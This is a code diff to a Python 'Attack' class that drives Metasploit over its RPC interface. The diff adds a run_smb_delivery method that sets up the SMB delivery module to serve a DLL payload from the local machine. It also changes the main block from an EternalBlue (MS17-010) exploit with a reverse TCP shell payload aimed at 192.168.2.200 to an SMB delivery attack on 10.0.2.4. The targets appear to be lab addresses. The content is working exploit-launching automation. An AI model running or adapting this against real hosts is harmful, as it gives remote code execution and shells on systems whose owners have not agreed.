@@ -14,13 +14,14 @@ class Attack:
 
     def __init__(self,
                  rpc: MsfRpcClient,
-                 rhost: str,
+                 rhost: str = None,
                  module: Modules = None,
                  payload: Payloads = None):
         self.__rpc = rpc
         self.__rhost = rhost
         self.__module_path = module
         self.__payload = payload
+        self.__ipv4 = get_ipv4()
         print('initialize successful')
 
     def setModule(self, module: Modules):
@@ -29,7 +30,7 @@ class Attack:
     def setPayload(self, payload: Payloads):
         self.__payload = payload
 
-    def run(self):
+    def run_eternal_blue(self):
         first_slash_index = self.__module_path.value.find('/')
         mtype = self.__module_path.value[:first_slash_index]
         mname = self.__module_path.value[first_slash_index + 1:]
@@ -40,13 +41,29 @@ class Attack:
             .console(self.__rpc.consoles.console().cid)
             .run_module_with_output(self.__module, PayloadModule(self.__rpc, self.__payload.value))
         )
+    
+    def run_smb_delivery(self):
+        first_slash_index = self.__module_path.value.find('/')
+        mtype = self.__module_path.value[:first_slash_index]
+        mname = self.__module_path.value[first_slash_index + 1:]
+        self.__module = self.__rpc.modules.use(mtype, mname)
+        self.__module.target = 0 # set DLL
+        # self.__module.targets => {0: 'DLL', 1: 'PSH'}
+        self.__module["SRVHOST"] = self.__ipv4
+        cid = self.__rpc.consoles.console().cid
+        console = self.__rpc.consoles.console(cid)
+        print(
+            console.run_module_with_output(self.__module)
+        )
+        print(console.read()) 
+        # Maybe show in GUI
+
 
 
 if __name__ == '__main__':
     client = MsfRpcClient("salt", port=55553, ssl=True)
 
-    atk = Attack(client, '192.168.2.200')
-    atk.setModule(Modules.MS17_010_ETERNALBLUE)
-    atk.setPayload(Payloads.REVERSE_TCP)
-
-    atk.run()
+    atk = Attack(client, '10.0.2.4')
+    atk.setModule(Modules.SMB_DELIVERY)
+    atk.run_smb_delivery()
+    
